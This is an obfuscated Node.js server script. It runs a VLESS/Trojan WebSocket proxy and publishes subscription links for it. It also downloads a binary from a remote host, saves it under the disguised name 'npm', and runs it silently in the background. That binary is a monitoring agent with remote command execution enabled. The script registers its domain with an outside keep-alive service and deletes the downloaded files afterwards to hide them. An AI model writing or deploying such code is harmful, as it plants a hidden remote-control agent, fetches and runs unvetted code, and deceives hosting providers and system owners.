const _0x5e7181=_0x1925;(function(_0x28cd48,_0x114f92){const _0x53f621=_0x1925,_0x1d5ef4=_0x28cd48();while(!![]){try{const _0x24f0d5=-parseInt(_0x53f621(0x176))/0x1+-parseInt(_0x53f621(0x193))/0x2*(-parseInt(_0x53f621(0x17e))/0x3)+-parseInt(_0x53f621(0x167))/0x4*(-parseInt(_0x53f621(0x1b8))/0x5)+parseInt(_0x53f621(0x175))/0x6*(parseInt(_0x53f621(0x1a2))/0x7)+parseInt(_0x53f621(0x188))/0x8*(parseInt(_0x53f621(0x1d8))/0x9)+-parseInt(_0x53f621(0x17f))/0xa+-parseInt(_0x53f621(0x16d))/0xb*(parseInt(_0x53f621(0x17a))/0xc);if(_0x24f0d5===_0x114f92)break;else _0x1d5ef4['push'](_0x1d5ef4['shift']());}catch(_0x5c461c){_0x1d5ef4['push'](_0x1d5ef4['shift']());}}}(_0x25d6,0x26ccd));const os=require('os'),http=require(_0x5e7181(0x1c5)),fs=require('fs'),axios=require(_0x5e7181(0x1b9)),net=require(_0x5e7181(0x1b3)),path=require(_0x5e7181(0x1a9)),crypto=require(_0x5e7181(0x1a1)),{Buffer}=require(_0x5e7181(0x1bc)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x5e7181(0x196)][_0x5e7181(0x1d7)]||'5a65fd3d-8967-4a67-94d1-73d329a5aa73',NEZHA_SERVER=process['env'][_0x5e7181(0x1a3)]||'',NEZHA_PORT=process[_0x5e7181(0x196)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x5e7181(0x196)][_0x5e7181(0x1c4)]||'',DOMAIN=process[_0x5e7181(0x196)][_0x5e7181(0x1d6)]||_0x5e7181(0x160),AUTO_ACCESS=process['env'][_0x5e7181(0x1aa)]||!![],WSPATH=process[_0x5e7181(0x196)][_0x5e7181(0x1c7)]||UUID[_0x5e7181(0x161)](0x0,0x8),SUB_PATH=process['env']['SUB_PATH']||_0x5e7181(0x194),NAME=process[_0x5e7181(0x196)][_0x5e7181(0x1c3)]||'Hug',PORT=process[_0x5e7181(0x196)][_0x5e7181(0x1bb)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1136ef=_0x5e7181;try{const _0x578909=await axios[_0x1136ef(0x1d3)](_0x1136ef(0x187)),_0x530ca5=_0x578909[_0x1136ef(0x1ab)];ISP=(_0x530ca5[_0x1136ef(0x1d1)]+'-'+_0x530ca5[_0x1136ef(0x1cd)])[_0x1136ef(0x16e)](/ /g,'_');}catch(_0x3d93bc){ISP='Unknown';}};GetISP();function _0x1925(_0x260b90,_0x1455ac){const _0x25d68b=_0x25d6();return _0x1925=function(_0x192561,_0x55f2a6){_0x192561=_0x192561-0x15a;let _0x617950=_0x25d68b[_0x192561];return _0x617950;},_0x1925(_0x260b90,_0x1455ac);}const httpServer=http[_0x5e7181(0x181)]((_0x34ad64,_0x2166ed)=>{const _0x3376ae=_0x5e7181;if(_0x34ad64[_0x3376ae(0x192)]==='/'){const _0x5ae76e=path['join'](__dirname,'index.html');fs[_0x3376ae(0x19d)](_0x5ae76e,_0x3376ae(0x1cc),(_0x2afb12,_0x39130a)=>{const _0x5904b9=_0x3376ae;if(_0x2afb12){_0x2166ed[_0x5904b9(0x166)](0xc8,{'Content-Type':_0x5904b9(0x1a5)}),_0x2166ed[_0x5904b9(0x186)](_0x5904b9(0x17c));return;}_0x2166ed['writeHead'](0xc8,{'Content-Type':_0x5904b9(0x1a5)}),_0x2166ed[_0x5904b9(0x186)](_0x39130a);});return;}else{if(_0x34ad64[_0x3376ae(0x192)]==='/'+SUB_PATH){const _0x50f47f=_0x3376ae(0x1b7)+UUID+'@'+DOMAIN+_0x3376ae(0x1bf)+DOMAIN+_0x3376ae(0x1b4)+DOMAIN+_0x3376ae(0x184)+WSPATH+'#'+NAME+'-'+ISP,_0x16d7b2=_0x3376ae(0x169)+UUID+'@'+DOMAIN+_0x3376ae(0x168)+DOMAIN+_0x3376ae(0x1b4)+DOMAIN+_0x3376ae(0x184)+WSPATH+'#'+NAME+'-'+ISP,_0x573f99=_0x50f47f+'\x0a'+_0x16d7b2,_0x4d22fc=Buffer[_0x3376ae(0x189)](_0x573f99)[_0x3376ae(0x15c)]('base64');_0x2166ed[_0x3376ae(0x166)](0xc8,{'Content-Type':_0x3376ae(0x19e)}),_0x2166ed[_0x3376ae(0x186)](_0x4d22fc+'\x0a');}else _0x2166ed[_0x3376ae(0x166)](0x194,{'Content-Type':_0x3376ae(0x19e)}),_0x2166ed[_0x3376ae(0x186)](_0x3376ae(0x1d0));}}),wss=new WebSocket[(_0x5e7181(0x1a0))]({'server':httpServer}),uuid=UUID[_0x5e7181(0x16e)](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x5e7181(0x1ca)];function resolveHost(_0x533345){return new Promise((_0x1fd283,_0x12ed4d)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0x533345)){_0x1fd283(_0x533345);return;}let _0x2f1115=0x0;function _0x589444(){const _0x23cac6=_0x1925;if(_0x2f1115>=DNS_SERVERS[_0x23cac6(0x163)]){_0x12ed4d(new Error('Failed\x20to\x20resolve\x20'+_0x533345+_0x23cac6(0x1b1)));return;}const _0x386b83=DNS_SERVERS[_0x2f1115];_0x2f1115++;const _0x240123=_0x23cac6(0x182)+encodeURIComponent(_0x533345)+_0x23cac6(0x1a8);axios[_0x23cac6(0x1d3)](_0x240123,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x23cac6(0x183)](_0x472848=>{const _0x1180d0=_0x23cac6,_0xedbf42=_0x472848[_0x1180d0(0x1ab)];if(_0xedbf42[_0x1180d0(0x15d)]===0x0&&_0xedbf42[_0x1180d0(0x15f)]&&_0xedbf42[_0x1180d0(0x15f)][_0x1180d0(0x163)]>0x0){const _0x42a28d=_0xedbf42[_0x1180d0(0x15f)][_0x1180d0(0x19c)](_0x4f5938=>_0x4f5938[_0x1180d0(0x195)]===0x1);if(_0x42a28d){_0x1fd283(_0x42a28d[_0x1180d0(0x1ab)]);return;}}_0x589444();})[_0x23cac6(0x19f)](_0x579c57=>{_0x589444();});}_0x589444();});}function handleVlessConnection(_0x109f72,_0xc1644a){const _0x163103=_0x5e7181,[_0x2bfd49]=_0xc1644a,_0x35439f=_0xc1644a[_0x163103(0x161)](0x1,0x11);if(!_0x35439f[_0x163103(0x165)]((_0xd68ed6,_0x5cfc18)=>_0xd68ed6==parseInt(uuid[_0x163103(0x1ae)](_0x5cfc18*0x2,0x2),0x10)))return![];let _0x1f69f7=_0xc1644a[_0x163103(0x161)](0x11,0x12)[_0x163103(0x172)]()+0x13;const _0x420882=_0xc1644a[_0x163103(0x161)](_0x1f69f7,_0x1f69f7+=0x2)[_0x163103(0x1af)](0x0),_0x2a555a=_0xc1644a[_0x163103(0x161)](_0x1f69f7,_0x1f69f7+=0x1)[_0x163103(0x172)](),_0x237cd8=_0x2a555a==0x1?_0xc1644a[_0x163103(0x161)](_0x1f69f7,_0x1f69f7+=0x4)[_0x163103(0x190)]('.'):_0x2a555a==0x2?new TextDecoder()['decode'](_0xc1644a['slice'](_0x1f69f7+0x1,_0x1f69f7+=0x1+_0xc1644a['slice'](_0x1f69f7,_0x1f69f7+0x1)['readUInt8']())):_0x2a555a==0x3?_0xc1644a[_0x163103(0x161)](_0x1f69f7,_0x1f69f7+=0x10)[_0x163103(0x197)]((_0x2b26f4,_0x38734c,_0x28e950,_0x15eb5c)=>_0x28e950%0x2?_0x2b26f4[_0x163103(0x1ad)](_0x15eb5c[_0x163103(0x161)](_0x28e950-0x1,_0x28e950+0x1)):_0x2b26f4,[])[_0x163103(0x16f)](_0x11a78c=>_0x11a78c[_0x163103(0x1af)](0x0)[_0x163103(0x15c)](0x10))[_0x163103(0x190)](':'):'';_0x109f72['send'](new Uint8Array([_0x2bfd49,0x0]));const _0x4191fa=createWebSocketStream(_0x109f72);return resolveHost(_0x237cd8)[_0x163103(0x183)](_0x1b8be5=>{const _0x509a2f=_0x163103;net[_0x509a2f(0x18b)]({'host':_0x1b8be5,'port':_0x420882},function(){const _0x1b52ba=_0x509a2f;this['write'](_0xc1644a[_0x1b52ba(0x161)](_0x1f69f7)),_0x4191fa['on']('error',()=>{})[_0x1b52ba(0x18e)](this)['on'](_0x1b52ba(0x17b),()=>{})[_0x1b52ba(0x18e)](_0x4191fa);})['on'](_0x509a2f(0x17b),()=>{});})[_0x163103(0x19f)](_0x459a9c=>{const _0x5705a0=_0x163103;net[_0x5705a0(0x18b)]({'host':_0x237cd8,'port':_0x420882},function(){const _0x386b89=_0x5705a0;this['write'](_0xc1644a['slice'](_0x1f69f7)),_0x4191fa['on'](_0x386b89(0x17b),()=>{})[_0x386b89(0x18e)](this)['on'](_0x386b89(0x17b),()=>{})[_0x386b89(0x18e)](_0x4191fa);})['on'](_0x5705a0(0x17b),()=>{});}),!![];}function handleTrojanConnection(_0x2a0e11,_0x4163d2){const _0x2f7d0f=_0x5e7181;try{if(_0x4163d2[_0x2f7d0f(0x163)]<0x3a)return![];const _0x33937d=_0x4163d2[_0x2f7d0f(0x161)](0x0,0x38)[_0x2f7d0f(0x15c)](),_0x131e5b=[UUID];let _0x588de3=null;for(const _0x160f4f of _0x131e5b){const _0x4f5998=crypto[_0x2f7d0f(0x1c2)](_0x2f7d0f(0x1b5))[_0x2f7d0f(0x19b)](_0x160f4f)[_0x2f7d0f(0x170)](_0x2f7d0f(0x18c));if(_0x4f5998===_0x33937d){_0x588de3=_0x160f4f;break;}}if(!_0x588de3)return![];let _0x5ae33c=0x38;_0x4163d2[_0x5ae33c]===0xd&&_0x4163d2[_0x5ae33c+0x1]===0xa&&(_0x5ae33c+=0x2);const _0x184e2c=_0x4163d2[_0x5ae33c];if(_0x184e2c!==0x1)return![];_0x5ae33c+=0x1;const _0x3c09e4=_0x4163d2[_0x5ae33c];_0x5ae33c+=0x1;let _0x469439,_0x221c71;if(_0x3c09e4===0x1)_0x469439=_0x4163d2[_0x2f7d0f(0x161)](_0x5ae33c,_0x5ae33c+0x4)[_0x2f7d0f(0x190)]('.'),_0x5ae33c+=0x4;else{if(_0x3c09e4===0x3){const _0x226856=_0x4163d2[_0x5ae33c];_0x5ae33c+=0x1,_0x469439=_0x4163d2[_0x2f7d0f(0x161)](_0x5ae33c,_0x5ae33c+_0x226856)[_0x2f7d0f(0x15c)](),_0x5ae33c+=_0x226856;}else{if(_0x3c09e4===0x4)_0x469439=_0x4163d2[_0x2f7d0f(0x161)](_0x5ae33c,_0x5ae33c+0x10)['reduce']((_0x372ae6,_0xbe03dd,_0x5ab1ba,_0x45d952)=>_0x5ab1ba%0x2?_0x372ae6[_0x2f7d0f(0x1ad)](_0x45d952[_0x2f7d0f(0x161)](_0x5ab1ba-0x1,_0x5ab1ba+0x1)):_0x372ae6,[])[_0x2f7d0f(0x16f)](_0xd0dc60=>_0xd0dc60[_0x2f7d0f(0x1af)](0x0)[_0x2f7d0f(0x15c)](0x10))[_0x2f7d0f(0x190)](':'),_0x5ae33c+=0x10;else return![];}}_0x221c71=_0x4163d2[_0x2f7d0f(0x1af)](_0x5ae33c),_0x5ae33c+=0x2;_0x5ae33c<_0x4163d2[_0x2f7d0f(0x163)]&&_0x4163d2[_0x5ae33c]===0xd&&_0x4163d2[_0x5ae33c+0x1]===0xa&&(_0x5ae33c+=0x2);const _0xc694ef=createWebSocketStream(_0x2a0e11);return resolveHost(_0x469439)[_0x2f7d0f(0x183)](_0x5bd149=>{const _0x3e3d72=_0x2f7d0f;net[_0x3e3d72(0x18b)]({'host':_0x5bd149,'port':_0x221c71},function(){const _0x1439d6=_0x3e3d72;_0x5ae33c<_0x4163d2[_0x1439d6(0x163)]&&this[_0x1439d6(0x173)](_0x4163d2[_0x1439d6(0x161)](_0x5ae33c)),_0xc694ef['on'](_0x1439d6(0x17b),()=>{})[_0x1439d6(0x18e)](this)['on'](_0x1439d6(0x17b),()=>{})['pipe'](_0xc694ef);})['on'](_0x3e3d72(0x17b),()=>{});})['catch'](_0x75b110=>{net['connect']({'host':_0x469439,'port':_0x221c71},function(){const _0x4d0f79=_0x1925;_0x5ae33c<_0x4163d2[_0x4d0f79(0x163)]&&this[_0x4d0f79(0x173)](_0x4163d2['slice'](_0x5ae33c)),_0xc694ef['on']('error',()=>{})[_0x4d0f79(0x18e)](this)['on'](_0x4d0f79(0x17b),()=>{})[_0x4d0f79(0x18e)](_0xc694ef);})['on']('error',()=>{});}),!![];}catch(_0x95dc5){return![];}}wss['on'](_0x5e7181(0x164),(_0x1a1f13,_0x1f03f5)=>{const _0x53f23d=_0x5e7181,_0x39825c=_0x1f03f5[_0x53f23d(0x192)]||'';_0x1a1f13[_0x53f23d(0x17d)](_0x53f23d(0x1a4),_0x5796b5=>{const _0x11f4cf=_0x53f23d;if(_0x5796b5[_0x11f4cf(0x163)]>0x11&&_0x5796b5[0x0]===0x0){const _0x1a4a0b=_0x5796b5[_0x11f4cf(0x161)](0x1,0x11),_0x36577b=_0x1a4a0b[_0x11f4cf(0x165)]((_0x117280,_0xac19b9)=>_0x117280==parseInt(uuid['substr'](_0xac19b9*0x2,0x2),0x10));if(_0x36577b){!handleVlessConnection(_0x1a1f13,_0x5796b5)&&_0x1a1f13['close']();return;}}!handleTrojanConnection(_0x1a1f13,_0x5796b5)&&_0x1a1f13[_0x11f4cf(0x199)]();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0xfd5d2e=_0x5e7181,_0x59a7de=os['arch']();return _0x59a7de===_0xfd5d2e(0x1c0)||_0x59a7de===_0xfd5d2e(0x16c)||_0x59a7de===_0xfd5d2e(0x162)?!NEZHA_PORT?_0xfd5d2e(0x18d):'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0xfd5d2e(0x178);},downloadFile=async()=>{const _0x481279=_0x5e7181;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2a1139=getDownloadUrl(),_0x49ba29=await axios({'method':_0x481279(0x1d3),'url':_0x2a1139,'responseType':_0x481279(0x1c8)}),_0x50563a=fs[_0x481279(0x1a7)]('npm');return _0x49ba29[_0x481279(0x1ab)][_0x481279(0x18e)](_0x50563a),new Promise((_0x5d0c08,_0xcd95cd)=>{const _0x3700ab=_0x481279;_0x50563a['on'](_0x3700ab(0x16b),()=>{const _0x38eaa4=_0x3700ab;console['log']('npm\x20download\x20successfully'),exec(_0x38eaa4(0x185),_0x6d0fbf=>{if(_0x6d0fbf)_0xcd95cd(_0x6d0fbf);_0x5d0c08();});}),_0x50563a['on']('error',_0xcd95cd);});}catch(_0x241d35){throw _0x241d35;}},runnz=async()=>{const _0x46ceb6=_0x5e7181;try{const _0x21861e=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x46ceb6(0x1cb)});if(_0x21861e[_0x46ceb6(0x1ba)]()!==''){console[_0x46ceb6(0x171)](_0x46ceb6(0x19a));return;}}catch(_0x2933f2){}await downloadFile();let _0x5144fa='',_0x48ddd2=[_0x46ceb6(0x18a),_0x46ceb6(0x15b),_0x46ceb6(0x1bd),'2087',_0x46ceb6(0x1ce),_0x46ceb6(0x1d5)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5497e3=_0x48ddd2[_0x46ceb6(0x177)](NEZHA_PORT)?_0x46ceb6(0x15e):'';_0x5144fa=_0x46ceb6(0x179)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5497e3+_0x46ceb6(0x1be);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xdce534=NEZHA_SERVER[_0x46ceb6(0x177)](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x3fedd3=_0x48ddd2['includes'](_0xdce534)?_0x46ceb6(0x1b2):_0x46ceb6(0x18f),_0x4c706f=_0x46ceb6(0x198)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x3fedd3+_0x46ceb6(0x1b0)+UUID;fs[_0x46ceb6(0x16a)](_0x46ceb6(0x1c6),_0x4c706f);}_0x5144fa=_0x46ceb6(0x1d2);}else{console[_0x46ceb6(0x171)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x5144fa,{'shell':_0x46ceb6(0x15a)},_0x4eb9e1=>{const _0x32cc98=_0x46ceb6;if(_0x4eb9e1)console['error'](_0x32cc98(0x180),_0x4eb9e1);else console[_0x32cc98(0x171)](_0x32cc98(0x1cf));});}catch(_0x3957aa){console[_0x46ceb6(0x17b)](_0x46ceb6(0x1c9)+_0x3957aa);}};async function addAccessTask(){const _0x5ec4d5=_0x5e7181;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x2ebb92=_0x5ec4d5(0x1c1)+DOMAIN;try{const _0xba38c0=await axios[_0x5ec4d5(0x174)](_0x5ec4d5(0x191),{'url':_0x2ebb92},{'headers':{'Content-Type':_0x5ec4d5(0x1ac)}});console[_0x5ec4d5(0x171)](_0x5ec4d5(0x1b6));}catch(_0x3e0000){}}const delFiles=()=>{const _0x5a30b3=_0x5e7181;fs[_0x5a30b3(0x1a6)]('npm',()=>{}),fs['unlink'](_0x5a30b3(0x1c6),()=>{});};httpServer['listen'](PORT,()=>{const _0x9b4033=_0x5e7181;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x9b4033(0x171)](_0x9b4033(0x1d4)+PORT);});function _0x25d6(){const _0x208582=['url','3016HvLODi','sub','type','env','reduce','client_secret:\x20','close','npm\x20is\x20already\x20running,\x20skip\x20running...','update','find','readFile','text/plain','catch','Server','crypto','21686socDaJ','NEZHA_SERVER','message','text/html','unlink','createWriteStream','&type=A','path','AUTO_ACCESS','data','application/json','concat','substr','readUInt16BE','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20with\x20all\x20DNS\x20servers','true','net','&fp=chrome&type=ws&host=','sha224','Automatic\x20Access\x20Task\x20added\x20successfully','vless://','3745HXnurO','axios','trim','PORT','buffer','2096','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&',':443?encryption=none&security=tls&sni=','arm','https://','createHash','NAME','NEZHA_KEY','http','config.yaml','WSPATH','stream','error:\x20','1.1.1.1','utf-8','utf8','asOrganization','2083','npm\x20is\x20running','Not\x20Found\x0a','country','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','get','Server\x20is\x20running\x20on\x20port\x20','2053','DOMAIN','UUID','4041swBdhY','/bin/bash','8443','toString','Status','--tls','Answer','1234.abc.com','slice','aarch64','length','connection','every','writeHead','892adpKfG',':443?security=tls&sni=','trojan://','writeFileSync','finish','arm64','862477bkgOZz','replace','map','digest','log','readUInt8','write','post','522NJPMfD','84923VJNrJc','includes','https://amd64.ssss.nyc.mn/agent','setsid\x20nohup\x20./npm\x20-s\x20','60UoQxfZ','error','Hello\x20world!','once','48fzSdoA','443590yQHnPK','npm\x20running\x20error:','createServer','https://dns.google/resolve?name=','then','&path=%2F','chmod\x20+x\x20npm','end','https://speed.cloudflare.com/meta','3912GmGJEe','from','443','connect','hex','https://arm64.ssss.nyc.mn/v1','pipe','false','join','https://oooo.serv00.net/add-url'];_0x25d6=function(){return _0x208582;};return _0x25d6();}
